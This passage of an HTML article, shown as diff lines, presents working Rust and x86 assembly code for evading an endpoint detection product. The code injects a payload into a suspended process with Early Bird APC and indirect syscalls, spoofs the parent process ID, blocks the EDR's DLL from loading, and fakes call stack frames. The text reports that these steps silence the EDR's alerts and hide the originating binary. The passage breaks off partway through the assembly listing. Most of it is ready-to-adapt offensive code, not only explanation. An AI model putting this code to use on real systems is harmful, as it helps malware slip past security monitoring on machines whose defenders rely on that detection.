+        </div>
+
+        <p>Basically, the <strong>address of the wanted function is retrieved</strong>. Then, <strong>a function pointer type</strong> matching the expected calling convention and signature is defined, <strong>allowing the raw address to be casted and invoked correctly</strong> with the correct memory layout. Once the pointer to the function is retrieved, the <strong>Nt function can be called</strong>. All function definitions can be found in this reference: <a href="https://ntdoc.m417z.com/" target="_blank">NtDoc - The native NT API online documentation</a>. The NtCreateUserProcess indirect syscall essentially follows the implementation of the seen syscall in the C. Indirect syscalls part.</p>
+
+        <p>Here, what is the most interesting is the kill chain:</p>
+
+        <div class="code-block">
+          <button class="code-toggle">
+            <span>Early Bird APC Kill Chain — Rust</span>
+            <span class="lang-badge">Rust</span>
+            <span class="arrow">▶</span>
+          </button>
+          <div class="code-content">
+<pre><code class="language-rust hljs" data-highlighted="yes"><span class="hljs-keyword">let</span> <span class="hljs-variable">status</span> = <span class="hljs-title function_ invoke__">nt_create_user_process</span>(
+    &amp;<span class="hljs-keyword">mut</span> process_handle,
+    &amp;<span class="hljs-keyword">mut</span> thread_handle,
+    windows::Win32::System::Threading::PROCESS_ALL_ACCESS.<span class="hljs-number">0</span>,
+    THREAD_ALL_ACCESS.<span class="hljs-number">0</span>,
+    ptr::<span class="hljs-title function_ invoke__">null_mut</span>(),
+    ptr::<span class="hljs-title function_ invoke__">null_mut</span>(),
+    <span class="hljs-number">0x00000100</span>, <span class="hljs-comment">// PROCESS_CREATE_FLAGS_INHERIT_FROM_PARENT</span>
+    <span class="hljs-number">0x1</span>,        <span class="hljs-comment">// THREAD_CREATE_FLAGS_SUSPENDED</span>
+    process_parameters,
+    create_info.<span class="hljs-title function_ invoke__">as_mut</span>(),
+    attr_list
+);
+
+<span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">base_adress</span>: *<span class="hljs-keyword">mut</span> core::ffi::c_void = ptr::<span class="hljs-title function_ invoke__">null_mut</span>();
+<span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">region_size</span>: <span class="hljs-type">usize</span> = MY_PAYLOAD.<span class="hljs-title function_ invoke__">len</span>();
+<span class="hljs-keyword">let</span> <span class="hljs-variable">allocation_type</span>: <span class="hljs-type">usize</span> = (MEM_COMMIT | MEM_RESERVE).<span class="hljs-number">0</span> <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>;
+<span class="hljs-keyword">let</span> <span class="hljs-variable">protect</span>: <span class="hljs-type">usize</span> = PAGE_EXECUTE_READWRITE.<span class="hljs-number">0</span> <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>;
+<span class="hljs-keyword">let</span> <span class="hljs-variable">status_va</span>: NTSTATUS = <span class="hljs-title function_ invoke__">nt_allocate_virtual_memory</span>(
+    process_handle, &amp;<span class="hljs-keyword">mut</span> base_adress, <span class="hljs-number">0</span>,
+    &amp;<span class="hljs-keyword">mut</span> region_size, allocation_type, protect
+).<span class="hljs-title function_ invoke__">unwrap</span>();
+
+<span class="hljs-keyword">let</span> <span class="hljs-variable">status</span> = <span class="hljs-title function_ invoke__">nt_write_virtual_memory</span>(
+    process_handle, base_adress,
+    MY_PAYLOAD.<span class="hljs-title function_ invoke__">as_ptr</span>() <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> core::ffi::c_void,
+    region_size, bytes_written
+);
+
+<span class="hljs-keyword">let</span> <span class="hljs-variable">status</span> = <span class="hljs-title function_ invoke__">nt_queue_apc_thread</span>(thread_handle, base_adress <span class="hljs-keyword">as</span> *<span class="hljs-keyword">const</span> <span class="hljs-type">u8</span>);
+
+<span class="hljs-keyword">let</span> <span class="hljs-variable">previous_suspended_count</span>: *<span class="hljs-keyword">mut</span> <span class="hljs-type">u32</span> = ptr::<span class="hljs-title function_ invoke__">null_mut</span>();
+<span class="hljs-keyword">let</span> <span class="hljs-variable">status</span> = <span class="hljs-title function_ invoke__">nt_resume_thread</span>(thread_handle, previous_suspended_count);</code></pre>
+          </div>
+        </div>
+
+        <p>If we take a look at the parameters passed to NtCreateUserProcess, the <strong>0x1 flag stands out</strong>, which is <strong>THREAD_CREATE_FLAGS_SUSPENDED</strong>. This means the thread will start in a <strong>suspended state</strong>. When the ResumeThread function is called, the payload in the <strong>APC queue</strong> is executed. It is because when a thread is started <strong>for the first time</strong>, since it was <strong>initialized in a suspended state</strong>, the <strong>RtlUserThreadStart</strong> function is called and this function <strong>checks for pending APC</strong>, and processes them if the APC queue is not empty. In practice, the RtlUserThreadStart calls the <strong>KiUserApcDispatcher</strong> which executes <strong>APC pending tasks</strong>. If we execute the developed solution with <strong>x64dbg</strong> and set a <strong>breakpoint</strong> on <strong>RtlUserThreadStart</strong> and <strong>KiUserApcDispatcher</strong>. The program stops on both breakpoints which demonstrates that <strong>APC pending tasks are processed</strong> when a <strong>suspended thread is resumed</strong> with the <strong>ResumeThread</strong> function:</p>
+        <img src="https://eyilink.github.io/articles/edr_article_images/image35.png" alt="x64dbg breakpoint on RtlUserThreadStart showing APC processing" class="article-img">
+        <p>Inspecting the call stack of the newly created process, it is <strong>clear that the RtlUserThreadStart function is called</strong>. Putting a <strong>breakpoint on KiUserApcDispatcher</strong> shows that it stopped on it, moreover the call stack on the <strong>breakpoint clearly shows that KiUserApcDispatcher is used</strong>:</p>
+        <img src="https://eyilink.github.io/articles/edr_article_images/image36.png" alt="x64dbg call stack showing KiUserApcDispatcher invocation" class="article-img">
+        <img src="https://eyilink.github.io/articles/edr_article_images/image37.png" alt="x64dbg KiUserApcDispatcher breakpoint detail" class="article-img">
+        <p>It is interesting to <strong>notice</strong> that <strong>NtTestAlert</strong> is <strong>invoked</strong>, even if it was <strong>not called explicitly</strong> in the program. Hence, a third party such as <strong>RtlUserThreadStart</strong> calls it which triggers the <strong>KiUserApcDispatcher</strong> routine that <strong>executes the shellcode queued with APC</strong>. So, in reality, RtlUserThreadStart executes pending APCs by calling NtTestAlert.</p>
+        <p>This technique results in <strong>silencing all the EDR's MITRE tags</strong>, but <strong>still shows in the EDR's kernel telemetry</strong> as <strong>process creation is detected through kernel callbacks</strong>. However, the EDR does not flag the injection like it used to flag it:</p>
+        <img src="https://eyilink.github.io/articles/edr_article_images/image30.png" alt="MDE telemetry after Early Bird APC injection: MITRE tags silenced" class="article-img">
+
+        <h3 id="s6b">B. PPID Spoofing</h3>
+        <p><strong>Parent PID spoofing</strong> is a technique that consists in <strong>forcing the parent PID of a newly created process to a certain value</strong>. To do so, the NtCreateUserProcess function implements the attribute list parameter which permits passing <strong>additional advanced characteristics about the newly created process</strong>.</p>
+        <div class="note">
+          <strong>Remark:</strong>
+          <p>The NtCreateUserProcess function implements three main parameters: the <strong>process parameters</strong> (RTL_USER_PROCESS_PARAMETERS), the <strong>create info parameter</strong> (PS_CREATE_INFO) and the <strong>attribute list parameter</strong> (PS_ATTRIBUTE_LIST) which allows to <strong>specify advanced characteristics about the process such as the parent PID</strong>, token security, mitigation policies (DEP, ASLR, etc.), handle inheritance, debugging and job objects.</p>
+        </div>
+        <p>In practice, to set the parent PID of a created process the <strong>0x60000</strong> attribute needs to take the value of the handle of the wanted PPID:</p>
+
+        <div class="code-block">
+          <button class="code-toggle">
+            <span>PPID Spoofing attribute — Rust</span>
+            <span class="lang-badge">Rust</span>
+            <span class="arrow">▶</span>
+          </button>
+          <div class="code-content">
+<pre><code class="language-rust hljs" data-highlighted="yes"><span class="hljs-comment">// PPID spoofing</span>
+(*base.<span class="hljs-title function_ invoke__">add</span>(<span class="hljs-number">1</span>)).Attribute = <span class="hljs-number">0x60000</span>;
+(*base.<span class="hljs-title function_ invoke__">add</span>(<span class="hljs-number">1</span>)).Size = std::mem::size_of::() <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>;
+(*base.<span class="hljs-title function_ invoke__">add</span>(<span class="hljs-number">1</span>)).Value = PsAttributeValue {
+    Value: parent_process_handle.<span class="hljs-number">0</span> <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>,
+};
+(*base.<span class="hljs-title function_ invoke__">add</span>(<span class="hljs-number">1</span>)).ReturnLength = std::ptr::<span class="hljs-title function_ invoke__">null_mut</span>();</code></pre>
+          </div>
+        </div>
+
+        <p>This mechanism <strong>allows to hide the creator of the process</strong> created by the <strong>Early Bird APC Queue injection</strong>. As a result, the <strong>name of the solution Stargate</strong>, which was the parent process of the injection, <strong>does not appear anymore in the EDR's telemetry</strong>, only the user is appearing (this permits to hide the initial binary):</p>
+        <img src="https://eyilink.github.io/articles/edr_article_images/image7.png" alt="EDR telemetry showing PPID spoofing result - solution name hidden" class="article-img">
+
+        <h3 id="s6c">C. Preventing Third-Party DLLs from Injecting into Our Process</h3>
+        <p>Another interesting option is the <strong>0x20010</strong> which allows to <strong>specify a mitigation policy that blocks DLL that are not signed by Microsoft</strong>. Therefore, <strong>it prevents the EDR from injecting into our solution in order to monitor it</strong>, hook some functions or change its behavior. The <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute#remarks" target="_blank">PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON</a> policy <strong>permits to block non Microsoft binaries</strong>:</p>
+
+        <div class="code-block">
+          <button class="code-toggle">
+            <span>Block non-Microsoft DLL policy — Rust</span>
+            <span class="lang-badge">Rust</span>
+            <span class="arrow">▶</span>
+          </button>
+          <div class="code-content">
+<pre><code class="language-rust hljs" data-highlighted="yes"><span class="hljs-comment">// Prevent DLL to inject in our process</span>
+<span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">policy</span>: <span class="hljs-type">u64</span> = <span class="hljs-number">0x0000100000000000</span>;
+(*base.<span class="hljs-title function_ invoke__">add</span>(<span class="hljs-number">2</span>)).Attribute = <span class="hljs-number">0x20010</span>;
+(*base.<span class="hljs-title function_ invoke__">add</span>(<span class="hljs-number">2</span>)).Size = std::mem::size_of::();
+(*base.<span class="hljs-title function_ invoke__">add</span>(<span class="hljs-number">2</span>)).Value = PsAttributeValue {
+    ValuePtr: &amp;<span class="hljs-keyword">mut</span> policy <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> <span class="hljs-type">u64</span> <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> _,
+};
+(*base.<span class="hljs-title function_ invoke__">add</span>(<span class="hljs-number">2</span>)).ReturnLength = std::ptr::<span class="hljs-title function_ invoke__">null_mut</span>();</code></pre>
+          </div>
+        </div>
+
+        <p>This can be asserted by checking the attributes shown in Process Hacker:</p>
+        <img src="https://eyilink.github.io/articles/edr_article_images/image8.png" alt="Process Hacker showing mitigation policies on the created process" class="article-img">
+        <div class="note">
+          <strong>Remark:</strong>
+          <p>In order to know the attributes values such as <strong>0x20010</strong> or <strong>0x60000</strong>, high-level functions of the API (such as CreateProcessW) need to be <strong>used with a debugger</strong> such as x64dbg in order to decipher the values passed in the attribute list parameter. They can be deduced using this method, which <strong>can be automated using Frida</strong>.</p>
+        </div>
+
+        <h3 id="s6d">D. Mitigating Call Stack Inspection</h3>
+        <p>In order to <strong>mitigate the origin DLL of indirect syscalls</strong>, and <strong>reduce call</strong> sta<strong>ck inspection capacities</strong>, a technique called <strong>call stack spoofing</strong> will be explained. This technique could be implemented here to make the <strong>call stack of the NtCreateUserProcess</strong> function, <strong>more legitimate</strong>, even if it is not an optimal study-case. An optimal study case is when functions from a payload contained in <strong>unbacked memory</strong> are called, here call stack spoofing is adequate since <strong>it could permit masking the unbacked space</strong> as it appears as <strong>raw addresses</strong> in the call stack. For example, if we place a breakpoint on NtCreateUserProcess and execute our solution, the call stack looks like this:</p>
+        <img src="https://eyilink.github.io/articles/edr_article_images/image9.png" alt="Actual call stack before spoofing showing raw addresses" class="article-img">
+        <p>The stack which is <strong>composed of stack frames</strong> which contain <strong>all the context necessary for execution of functions</strong>. Each stack frame is composed of the <strong>function's return address</strong> and <strong>parameters needed to process this function</strong>. A call stack is a <strong>list of nested function calls</strong> that were made to get to <strong>the current inspected function</strong>. Some EDRs use this mechanism to <strong>judge if a syscall is legitimate</strong>. All the elements in the red square can be replaced by building <strong>a fake stack frame</strong>. Here, the <strong>wanted call stack</strong> when reaching the NtCreateUserProcess function is:</p>
+
+        <div class="code-block">
+          <button class="code-toggle">
+            <span>Target call stack</span>
+            <span class="lang-badge">Text</span>
+            <span class="arrow">▶</span>
+          </button>
+          <div class="code-content">
+<pre><code class="language-plaintext hljs" data-highlighted="yes">ntdll.NtCreateUserProcess
+kernel32.Gadget_Random_Function
+kernel32.BaseThreadInitThunk
+ntdll.RtlUserThreadStart</code></pre>
+          </div>
+        </div>
+
+        <p>The presented call stack can be faked. First let's explain the choice of ntdll.RtlUserThreadStart and kernel32.BaseThreadInitThunk in the desired call stack. These two elements are functions that are <strong>always called when a thread is started</strong>. Hence, they appear <strong>legitimate</strong> for the EDR.</p>
+
+        <p>Then, the kernel32.Gadget_Random_Function function in the call is a <strong>random function that will need to be used</strong>. More specifically, the <strong>gadget that resides in this function is mandatory</strong> in order to create a fake call stack. Lastly, we have the NtCreateUserProcess syscall which is the goal of the whole call stack spoofing in order to make it <strong>appear more legitimate</strong>.</p>
+
+        <p>To create a fake call stack, it is needed to create <strong>fake stack frames</strong>. To create fake stack frames, the <strong>size of each stack frame needs to be known</strong>. To do so, there is a mechanism called <strong>stack unwinding</strong> that <strong>occurs natively in Windows</strong>. To calculate the right size to unwind the stack, the OS looks at the <strong>.pdata section</strong> which contains an <strong>array of RUNTIME_FUNCTION</strong>, in which the <strong>UnwindData field is an offset to an UNWIND_INFO</strong> structure. The <strong>array of UnwindCodes permits to calculate a function's stack frame's size</strong>.</p>
+
+       
+
+                <img src="https://eyilink.github.io/articles/edr_article_images/image13.png" alt="RUNTIME_FUNCTION and UNWIND_INFO structure diagram" class="article-img">
+        <p>The UNWIND_INFO structure contains <strong>an array of UnwindCodes</strong> which <strong>represents instructions set in a function's</strong> prologue, which <strong>basically represents elements of the function's context needed in the stack frame</strong>. The <strong>array of UnwindCodes permits to calculate a function's stack frame's size</strong>. UnwindCode is an enum defined as follows:</p>
+        <div class="code-block">
+          <button class="code-toggle">
+            <span>UnwindCode enum — Rust</span>
+            <span class="lang-badge">Rust</span>
+            <span class="arrow">▶</span>
+          </button>
+          <div class="code-content">
+<pre><code class="language-rust hljs" data-highlighted="yes"><span class="hljs-keyword">enum</span> <span class="hljs-title class_">UnwindCode</span> {
+    UWOP_PUSH_NONVOL = <span class="hljs-number">0</span>,
+    UWOP_ALLOC_LARGE = <span class="hljs-number">1</span>,
+    UWOP_ALLOC_SMALL = <span class="hljs-number">2</span>,
+    UWOP_SET_FPREG = <span class="hljs-number">3</span>,
+    UWOP_SAVE_NONVOL = <span class="hljs-number">4</span>,
+    UWOP_SAVE_NONVOL_FAR = <span class="hljs-number">5</span>,
+    UWOP_SAVE_XMM128 = <span class="hljs-number">8</span>,
+    UWOP_SAVE_XMM128_FAR = <span class="hljs-number">9</span>,
+    UWOP_PUSH_MACHFRAME = <span class="hljs-number">10</span>
+}</code></pre>
+          </div>
+        </div>
+        <p>The full code to compute a function stack size is as follows:</p>
+         <div class="code-block">
+          <button class="code-toggle">
+            <span>calculate_function_stack_size() — Rust</span>
+            <span class="lang-badge">Rust</span>
+            <span class="arrow">▶</span>
+          </button>
+          <div class="code-content">
+<pre><code class="language-rust hljs" data-highlighted="yes"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">calculate_function_stack_size</span>(
+    <span class="hljs-keyword">mut</span> pruntime_function: *<span class="hljs-keyword">mut</span> IMAGE_RUNTIME_FUNCTION_ENTRY,
+    image_base: <span class="hljs-type">u64</span>,
+) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">u32</span> {
+    <span class="hljs-keyword">let</span> <span class="hljs-variable">base_ptr</span> = (((*pruntime_function).Anonymous.UnwindData <span class="hljs-keyword">as</span> <span class="hljs-type">u64</span>) + image_base) <span class="hljs-keyword">as</span> *<span class="hljs-keyword">const</span> <span class="hljs-type">u8</span>;
+    <span class="hljs-keyword">let</span> <span class="hljs-variable">byte0</span>       = *base_ptr;
+    <span class="hljs-keyword">let</span> <span class="hljs-variable">flags</span>       = (byte0 &gt;&gt; <span class="hljs-number">3</span>) &amp; <span class="hljs-number">0x1F</span>;
+    <span class="hljs-keyword">let</span> <span class="hljs-variable">count_codes</span> = *base_ptr.<span class="hljs-title function_ invoke__">add</span>(<span class="hljs-number">2</span>) <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>;
+    <span class="hljs-keyword">let</span> <span class="hljs-variable">unwind_codes_ptr</span> = base_ptr.<span class="hljs-title function_ invoke__">add</span>(<span class="hljs-number">4</span>) <span class="hljs-keyword">as</span> *<span class="hljs-keyword">const</span> <span class="hljs-type">u16</span>;
+    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">total</span>: <span class="hljs-type">u32</span> = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">i</span>: <span class="hljs-type">usize</span> = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">while</span> i &lt; count_codes {
+        <span class="hljs-keyword">let</span> <span class="hljs-variable">slot</span> = *unwind_codes_ptr.<span class="hljs-title function_ invoke__">add</span>(i);
+        <span class="hljs-keyword">let</span> <span class="hljs-variable">op_byte</span>   = (slot &gt;&gt; <span class="hljs-number">8</span>) <span class="hljs-keyword">as</span> <span class="hljs-type">u8</span>;
+        <span class="hljs-keyword">let</span> <span class="hljs-variable">unwind_op</span> = op_byte &amp; <span class="hljs-number">0x0F</span>;
+        <span class="hljs-keyword">let</span> <span class="hljs-variable">op_info</span>   = (op_byte &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0x0F</span>;
+        <span class="hljs-keyword">match</span> unwind_op {
+            UWOP_PUSH_NONVOL =&gt; { total += <span class="hljs-number">8</span>; i += <span class="hljs-number">1</span>; }
+            UWOP_ALLOC_LARGE =&gt; {
+                i += <span class="hljs-number">1</span>;
+                <span class="hljs-keyword">let</span> <span class="hljs-variable">next</span> = *unwind_codes_ptr.<span class="hljs-title function_ invoke__">add</span>(i) <span class="hljs-keyword">as</span> <span class="hljs-type">u32</span>;
+                <span class="hljs-keyword">if</span> op_info == <span class="hljs-number">0</span> { total += next * <span class="hljs-number">8</span>; i += <span class="hljs-number">1</span>; }
+                <span class="hljs-keyword">else</span> { i += <span class="hljs-number">1</span>; <span class="hljs-keyword">let</span> <span class="hljs-variable">high</span> = (*unwind_codes_ptr.<span class="hljs-title function_ invoke__">add</span>(i) <span class="hljs-keyword">as</span> <span class="hljs-type">u32</span>) &lt;&lt; <span class="hljs-number">16</span>; total += next + high; i += <span class="hljs-number">1</span>; }
+            }
+            UWOP_ALLOC_SMALL =&gt; { total += (op_info <span class="hljs-keyword">as</span> <span class="hljs-type">u32</span> * <span class="hljs-number">8</span>) + <span class="hljs-number">8</span>; i += <span class="hljs-number">1</span>; }
+            UWOP_SET_FPREG   =&gt; { i += <span class="hljs-number">1</span>; }
+            UWOP_SAVE_NONVOL =&gt; { i += <span class="hljs-number">1</span>; }
+            UWOP_SAVE_NONVOL_FAR =&gt; { i += <span class="hljs-number">2</span>; }
+            UWOP_SAVE_XMM128 =&gt; { i += <span class="hljs-number">2</span>; }
+            UWOP_SAVE_XMM128_FAR =&gt; { i += <span class="hljs-number">3</span>; }
+            UWOP_PUSH_MACHFRAME  =&gt; { i += <span class="hljs-number">1</span>; }
+            _ =&gt; { i += <span class="hljs-number">1</span>; }
+        }
+    }
+    <span class="hljs-keyword">if</span> (flags &amp; <span class="hljs-number">0x4</span>) != <span class="hljs-number">0</span> {
+        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">chain_idx</span> = count_codes;
+        <span class="hljs-keyword">if</span> (chain_idx &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> { chain_idx += <span class="hljs-number">1</span>; }
+        <span class="hljs-keyword">let</span> <span class="hljs-variable">chained_rf</span> = unwind_codes_ptr.<span class="hljs-title function_ invoke__">add</span>(chain_idx) <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> IMAGE_RUNTIME_FUNCTION_ENTRY;
+        <span class="hljs-keyword">return</span> total + <span class="hljs-title function_ invoke__">calculate_function_stack_size</span>(chained_rf, image_base);
+    }
+    total
+}</code></pre>
+          </div>
+        </div>
+        <p>Now being able to compute the stack frame's sizes, we can <strong>focus on the gadget's purpose</strong>. The gadget that is searched is a jmp qword [rbx] in which we <strong>can manipulate the RBX register</strong> via ASM. So when a <strong>ret instruction</strong> is hit, <strong>if the address of the gadget is on top of the stack it will be used to jump to the address contained in RBX</strong>.</p>
+
+        <p>Since our gadget is jmp qword [rbx], and we can <strong>manipulate RBX to our convenience</strong>. <strong>After</strong> each <strong>syscall instruction</strong>, <strong>there is a ret instruction</strong>. Hence, <strong>with a gadget like this</strong> we <strong>can jump to the wanted part of the code</strong> after a syscall instruction, which is our case <strong>when executing NtCreateUserProcess</strong>. The gadget can be found with the following piece of code:</p>
+
+        <div class="code-block">
+          <button class="code-toggle">
+            <span>find_all_jmp_rbx_gadgets() — Rust</span>
+            <span class="lang-badge">Rust</span>
+            <span class="arrow">▶</span>
+          </button>
+          <div class="code-content">
+<pre><code class="language-rust hljs" data-highlighted="yes"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">find_all_jmp_rbx_gadgets</span>(module_base: *<span class="hljs-keyword">mut</span> <span class="hljs-type">u8</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Vec</span>&lt;(*<span class="hljs-keyword">const</span> <span class="hljs-type">u8</span>, <span class="hljs-type">u64</span>)&gt; {
+    <span class="hljs-keyword">unsafe</span> {
+        <span class="hljs-keyword">let</span> <span class="hljs-variable">dos_header</span> = module_base <span class="hljs-keyword">as</span> *<span class="hljs-keyword">const</span> IMAGE_DOS_HEADER;
+        <span class="hljs-keyword">let</span> <span class="hljs-variable">nt_headers</span> = module_base.<span class="hljs-title function_ invoke__">add</span>((*dos_header).e_lfanew <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>) <span class="hljs-keyword">as</span> *<span class="hljs-keyword">const</span> IMAGE_NT_HEADERS64;
+        <span class="hljs-keyword">let</span> <span class="hljs-variable">image_size</span> = (*nt_headers).OptionalHeader.SizeOfImage <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>;
+        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">results</span> = <span class="hljs-type">Vec</span>::<span class="hljs-title function_ invoke__">new</span>();
+        <span class="hljs-keyword">for</span> <span class="hljs-variable">i</span> <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>..image_size - <span class="hljs-number">1</span> {
+            <span class="hljs-keyword">let</span> <span class="hljs-variable">byte</span> = module_base.<span class="hljs-title function_ invoke__">add</span>(i);
+            <span class="hljs-keyword">if</span> *byte == <span class="hljs-number">0xFF</span> &amp;&amp; *byte.<span class="hljs-title function_ invoke__">add</span>(<span class="hljs-number">1</span>) == <span class="hljs-number">0x23</span> {
+                <span class="hljs-keyword">let</span> <span class="hljs-variable">gadget_addr</span> = byte <span class="hljs-keyword">as</span> *<span class="hljs-keyword">const</span> <span class="hljs-type">u8</span>;
+                <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">image_base</span>: <span class="hljs-type">u64</span> = <span class="hljs-number">0</span>;
+                <span class="hljs-keyword">let</span> <span class="hljs-variable">prf</span> = windows::Win32::System::Diagnostics::<span class="hljs-built_in">Debug</span>::<span class="hljs-title function_ invoke__">RtlLookupFunctionEntry</span>(
+                    gadget_addr <span class="hljs-keyword">as</span> <span class="hljs-type">u64</span>,
+                    &amp;<span class="hljs-keyword">mut</span> image_base,
+                    <span class="hljs-title function_ invoke__">Some</span>(std::ptr::<span class="hljs-title function_ invoke__">null_mut</span>()),
+                );
+                <span class="hljs-keyword">if</span> prf.<span class="hljs-title function_ invoke__">is_null</span>() { <span class="hljs-keyword">continue</span>; }
+                <span class="hljs-keyword">let</span> <span class="hljs-variable">frame_size</span> = <span class="hljs-title function_ invoke__">calculate_function_stack_size</span>(prf, image_base) <span class="hljs-keyword">as</span> <span class="hljs-type">u64</span>;
+                results.<span class="hljs-title function_ invoke__">push</span>((gadget_addr, frame_size));
+            }
+        }
+        results
+    }
+}</code></pre>
+          </div>
+        </div>
+
+        <p>This jmp instruction will be <strong>used to jump to a part of memory</strong> (.restore part) where we will <strong>restore the stack manually</strong> in ASM, since we created fake stack frames if we don't restore the stack manually the program will crash. The ASM code needs to be in a separate file as <strong>Rust does not permit stack manipulation from the ASM macro</strong> (there is an experimental macro named NAKED_ASM, but it was not used during the development of this tool). The ASM code used for call stack spoofing is as follows:</p>
+
+        <div class="code-block">
+          <button class="code-toggle">
+            <span>Spoof() — Call stack spoofing — ASM (NASM)</span>
+            <span class="lang-badge">ASM</span>
+            <span class="arrow">▶</span>
+          </button>
+          <div class="code-content">
+<pre><code class="language-x86asm hljs" data-highlighted="yes"><span class="hljs-comment">; =========================</span>
+<span class="hljs-comment">; STACK_INFO OFFSETS</span>
+<span class="hljs-comment">; =========================</span>
+<span class="hljs-meta">%define</span> pRtlUserThreadStart_RetAddr    <span class="hljs-number">0</span>
+<span class="hljs-meta">%define</span> dwRtlUserThreadStart_Size      <span class="hljs-number">8</span>
+<span class="hljs-meta">%define</span> pBaseThreadInitThunk_RedAddr   <span class="hljs-number">16</span>
+<span class="hljs-meta">%define</span> dwBaseThreadInitThunk_Size     <span class="hljs-number">24</span>
+<span class="hljs-meta">%define</span> pGadgetAddr                    <span class="hljs-number">32</span>
+<span class="hljs-meta">%define</span> dwGadget_Size                  <span class="hljs-number">40</span>
+<span class="hljs-meta">%define</span> pTargetFunction                <span class="hljs-number">48</span>
+<span class="hljs-meta">%define</span> pRbx                           <span class="hljs-number">56</span>
+<span class="hljs-meta">%define</span> dwNumberOfArgs                 <span class="hljs-number">64</span>
+<span class="hljs-meta">%define</span> pArgs                          <span class="hljs-number">72</span>
+<span class="hljs-meta">%define</span> arg8                           <span class="hljs-number">80</span>
+<span class="hljs-meta">%define</span> arg9                           <span class="hljs-number">88</span>
+<span class="hljs-meta">%define</span> arg10                          <span class="hljs-number">96</span>
+<span class="hljs-meta">%define</span> ssn                            <span class="hljs-number">104</span>
+<span class="hljs-meta">%define</span> jmp_stub                       <span class="hljs-number">112</span>
+
+<span class="hljs-meta">global</span> Spoof
+<span class="hljs-meta">section</span> .text
+<span class="hljs-symbol">
+Spoof:</span>
+    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">r15</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r13</span>, <span class="hljs-built_in">rcx</span>
+    <span class="hljs-keyword">push</span> <span class="hljs-number">0</span>
+
+<span class="hljs-comment">; --- RtlUserThreadStart frame ---</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, [<span class="hljs-built_in">r13</span> + dwRtlUserThreadStart_Size]
+    <span class="hljs-keyword">sub</span> <span class="hljs-built_in">rsp</span>, <span class="hljs-built_in">r10</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, [<span class="hljs-built_in">r13</span> + pRtlUserThreadStart_RetAddr]
+    <span class="hljs-keyword">push</span> <span class="hljs-built_in">r10</span>
+
+<span class="hljs-comment">; --- BaseThreadInitThunk frame ---</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, [<span class="hljs-built_in">r13</span> + dwBaseThreadInitThunk_Size]
+    <span class="hljs-keyword">sub</span> <span class="hljs-built_in">rsp</span>, <span class="hljs-built_in">r10</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, [<span class="hljs-built_in">r13</span> + pBaseThreadInitThunk_RedAddr]
+    <span class="hljs-keyword">push</span> <span class="hljs-built_in">r10</span>
+
+<span class="hljs-comment">; --- Gadget frame ---</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, [<span class="hljs-built_in">r13</span> + dwGadget_Size]
+    <span class="hljs-keyword">sub</span> <span class="hljs-built_in">rsp</span>, <span class="hljs-built_in">r10</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, [<span class="hljs-built_in">r13</span> + pGadgetAddr]
+    <span class="hljs-keyword">push</span> <span class="hljs-built_in">r10</span>
+
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, [<span class="hljs-built_in">r13</span> + pArgs]
+
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [<span class="hljs-built_in">rsp</span> + <span class="hljs-number">40</span>], <span class="hljs-number">0</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [<span class="hljs-built_in">rsp</span> + <span class="hljs-number">48</span>], <span class="hljs-number">0</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [<span class="hljs-built_in">rsp</span> + <span class="hljs-number">56</span>], <span class="hljs-number">512</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [<span class="hljs-built_in">rsp</span> + <span class="hljs-number">64</span>], <span class="hljs-number">1</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r11</span>, [<span class="hljs-built_in">r13</span> + arg8]  <span class="hljs-comment">; mov [rsp + 72], r11</span>
+    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rsp</span> + <span class="hljs-number">72</span>], <span class="hljs-built_in">r11</span>
